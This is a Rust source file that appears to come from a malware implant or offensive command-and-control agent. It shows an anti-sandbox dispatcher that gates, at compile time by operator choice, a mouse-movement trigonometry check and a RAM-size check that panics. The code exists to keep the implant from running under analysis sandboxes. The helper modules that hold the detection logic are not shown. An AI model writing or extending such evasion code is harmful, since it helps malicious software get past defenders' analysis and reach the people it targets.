mod memory;
mod trig;

/// This function takes care of anti-sandbox analysis, and depending upon the sandbox checks performed
/// it w ill either panic, or continue looping until a condition is met.
///
/// The anti-sandbox features are feature-gated such that they can be configured by the operator and conditionally
/// compiled.
pub fn anti_sandbox() {
    // Note: full list of potential features to implement here
    // https://unprotect.it/category/sandbox-evasion/

    #[cfg(feature = "sandbox_trig")]
    {
        use std::sync::atomic::Ordering;

        use crate::entry::IS_IMPLANT_SVC;
        // We cannot do this check when running as a svc
        if !IS_IMPLANT_SVC.load(Ordering::SeqCst) {
            use crate::anti_sandbox::trig::trig_mouse_movements;

            #[cfg(debug_assertions)]
            use shared::pretty_print::print_info;

            #[cfg(debug_assertions)]
            print_info("Waiting on trig test completion...");

            // N.b. this could block for a period of time; but will not panic. See function for more details.
            trig_mouse_movements();

            #[cfg(debug_assertions)]
            print_info("Trig test complete..");
        }
    }

    #[cfg(feature = "sandbox_mem")]
    {
        use crate::anti_sandbox::memory::validate_ram_sz_or_panic;

        validate_ram_sz_or_panic();

        #[cfg(debug_assertions)]
        {
            use shared::pretty_print::print_info;
            print_info("Ram size check complete..");
        }
    }
}
